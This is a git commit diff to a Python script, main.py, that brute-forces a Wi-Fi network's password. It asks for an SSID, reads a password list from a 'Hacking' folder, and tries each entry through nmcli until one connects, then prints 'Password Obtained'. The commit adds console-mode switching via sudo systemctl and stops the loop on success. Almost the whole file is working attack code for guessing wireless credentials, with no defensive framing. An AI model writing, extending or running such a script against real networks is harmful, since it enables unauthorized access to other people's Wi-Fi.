44059cba0efcfa5d1fcd266528851e564963f1c1
Immanuel Alex <iammalex125@gmail.com>
2025-01-23 13:17:27 +0530

    cli integration and wifi display

--- main.py
+++ main.py
@@ -1,14 +1,22 @@
 #!/usr/bin/python3
 
+
+# //////////// need to implement CLI VERSION //////////////
+
+
 import sys
 import os
 import time
 
 flag = False
 
+os.system("nmcli device wifi")
+
 print("___ Enter the SSID ___ \n")
 ssid = input("SSID:")
 
+print("Please enter your sudo password :")
+os.system("sudo systemctl isolate multi-user.target")
 
 def pas():
 	os.chdir('/home/alex/Documents/Hacking')
@@ -34,34 +42,40 @@ for i in banner:
     
 time.sleep(0.02)
 								
-
-stm = "nmcli device wifi connect"
-
 pswd_lst = pas()
 
-
+count = 0
 for pswd in pswd_lst:
 
     if len(pswd) < 8:
         continue
-
+    
+        
+    if count == 10:
+        os.system("sudo systemctl isolate graphical.target")
+    
+    count += 1
+    
     try:
 	    cmd = (f"nmcli device wifi connect {ssid} password {pswd}")
 	    print("trying : " + pswd)
-	    result = os.system(cmd)
 	    
+	    result = os.system(cmd)
 	    time.sleep(2)
 	    
 	    if (result == 0):
 	        print(f"Password Obtained {pswd}")
+	        os.system("sudo systemctl isolate graphical.target")
+	        break
 	        
 	    else: 
 	        print(f"-- Incorrect password {pswd}")
+	        
     except OSError:
         print("+++ == AN ERROR OCCURED == +++")
         break
 
-end_msg = " ___ BRUTEFORCE completed ___"
+end_msg = " ___ BRUTEFORCE completed ___ "
 
 for i in end_msg:
     sys.stdout.write(i)
